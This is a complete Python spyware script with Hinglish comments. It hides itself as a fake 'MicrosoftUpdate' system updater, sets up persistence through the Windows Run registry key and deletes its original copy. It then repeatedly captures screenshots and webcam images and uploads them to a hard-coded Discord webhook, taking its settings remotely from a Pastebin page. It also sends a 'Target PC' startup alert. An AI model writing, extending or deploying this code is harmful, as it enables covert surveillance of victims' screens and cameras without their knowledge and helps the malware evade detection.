import time
import os
import sys
import shutil
import subprocess
import pyautogui
from datetime import datetime
import requests
import cv2
import io  # Files ko memory mein rakhne ke liye zaroori

# --- CONFIGURATION ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1546755648417570857/hHtdslFtEQdo9GWOdgPn7t6mF-ZXUe_DRcRqymQ80tPitHL14Efx4LDm6TPDWABKryz7"
PASTEBIN_URL = "https://pastebin.com/raw/m4bAEuKp"  
# ---------------------

def persistence_and_hide():
    """Script ko hidden folder mein move karna aur startup mein add karna"""
    try:
        if getattr(sys, 'frozen', False):
            current_path = sys.executable
            file_name = os.path.basename(current_path)
        else:
            current_path = os.path.abspath(__file__)
            file_name = "system_updater.py"

        appdata_dir = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'MicrosoftUpdate')
        if not os.path.exists(appdata_dir):
            os.makedirs(appdata_dir)

        target_path = os.path.join(appdata_dir, file_name)

        if os.path.abspath(current_path) != os.path.abspath(target_path):
            if os.path.exists(target_path):
                try:
                    os.remove(target_path)
                except Exception:
                    pass
            
            shutil.copy2(current_path, target_path)

            try:
                import winreg
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, "WinSysUpdater", 0, winreg.REG_SZ, f'"{target_path}"')
            except Exception:
                pass

            if getattr(sys, 'frozen', False):
                subprocess.Popen([target_path], creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                subprocess.Popen([sys.executable, target_path], creationflags=subprocess.CREATE_NO_WINDOW)

            try:
                if getattr(sys, 'frozen', False):
                    bat_path = os.path.join(os.environ['TEMP'], 'clean.bat')
                    with open(bat_path, 'w') as bat:
                        bat.write(f'@echo off\n')
                        bat.write(f'timeout /t 3 /nobreak > nul\n')
                        bat.write(f'del "{current_path}"\n')
                        bat.write(f'del "{bat_path}"\n')
                    subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            except Exception:
                pass

            sys.exit(0)
    except Exception as e:
        pass

# Pehle step mein hidden location par shift hona
persistence_and_hide()

def send_file_bytes_to_discord(file_bytes_list):
    """Memory (RAM) se direct Discord webhook par files send karne ka function"""
    try:
        for filename, byte_arr in file_bytes_list:
            files = {'file': (filename, byte_arr.getvalue(), 'image/png')}
            payload = {'content': f"📸 **Capture** - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
            requests.post(WEBHOOK_URL, data=payload, files=files)
    except Exception as e:
        pass

def get_pastebin_config():
    """Pastebin se status, interval aur separate controls fetch karne ka function"""
    try:
        response = requests.get(PASTEBIN_URL, timeout=10)
        if response.status_code == 200:
            lines = response.text.strip().split('\n')
            config = {}
            for line in lines:
                if '=' in line:
                    key, value = line.split('=', 1)
                    config[key.strip().lower()] = value.strip().lower()
            return config
    except Exception:
        pass
    return None

# --- STARTUP NOTIFICATION ---
try:
    startup_payload = {'content': "🚀 **System Online Notification**: Target PC startup successful. Monitoring service has started."}
    requests.post(WEBHOOK_URL, data=startup_payload)
except Exception:
    pass

# Main Loop
while True:
    config = get_pastebin_config()
    
    if config:
        status = config.get("status", "run")
        ss_status = config.get("screenshot", "on")  # 'on' or 'off'
        cam_status = config.get("camera", "on")      # 'on' or 'off'
        try:
            interval = int(config.get("interval", 3))
        except ValueError:
            interval = 3
    else:
        status = "run"
        ss_status = "on"
        cam_status = "on"
        interval = 3

    if status == "stop":
        time.sleep(5)
        continue

    files_to_send = []
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

    try:
        # 1. Screenshot Capture (Controlled via Pastebin: screenshot=on/off)
        if ss_status == "on":
            screenshot = pyautogui.screenshot()
            screen_io = io.BytesIO()
            screenshot.save(screen_io, format='PNG')
            files_to_send.append((f"screen_{timestamp}.png", screen_io))

        # 2. Webcam Snapshot Capture (Controlled via Pastebin: camera=on/off)
        if cam_status == "on":
            cam = cv2.VideoCapture(0, cv2.CAP_DSHOW) # DirectShow fast open ke liye
            if cam.isOpened():
                ret, frame = cam.read()
                if ret:
                    success, encoded_image = cv2.imencode('.png', frame)
                    if success:
                        cam_io = io.BytesIO(encoded_image.tobytes())
                        files_to_send.append((f"webcam_{timestamp}.png", cam_io))
                cam.release()

        # 3. Send captured items directly from memory to Discord
        if files_to_send:
            send_file_bytes_to_discord(files_to_send)

    except Exception as e:
        pass

    time.sleep(interval)